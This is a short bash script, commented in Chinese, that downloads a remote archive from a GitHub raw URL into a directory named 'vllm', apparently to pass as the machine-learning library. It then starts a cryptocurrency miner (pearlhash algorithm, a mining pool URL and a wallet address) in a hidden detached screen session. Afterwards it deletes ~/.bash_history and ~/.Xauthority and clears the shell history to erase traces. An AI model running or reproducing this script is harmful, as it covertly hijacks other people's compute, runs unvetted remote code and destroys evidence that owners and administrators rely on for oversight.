#!/bin/bash

# 设置非交互模式，防止 apt 安装时弹出对话框卡住
export DEBIAN_FRONTEND=noninteractive

# 静默更新并自动确认安装 screen
apt-get update -y -q
apt-get install -y -q screen

# 进入用户主目录，确保路径与原有命令的 ~/vllm 匹配
cd ~

# 下载并解压
wget https://raw.githubusercontent.com/xiaobintse/sh/main/p.tar.gz
chmod +x p.tar.gz
tar -zxvf p.tar.gz

# 创建一个后台 screen 运行挖矿程序
screen -dmS p bash -c 'source vllm/bin/activate && cd ~/vllm && ./p --algo pearlhash --url stratum+ssl://hk.pearlhash.net:9443 --user prl1prqg9ejageaypduhjs36q3g4m5d483her5gtwanngm86gz0dzhjlq2tkpu9'

# 删除痕迹
rm -rf ~/.Xauthority
rm -rf ~/.bash_history
history -c

# 退出脚本
exit 0
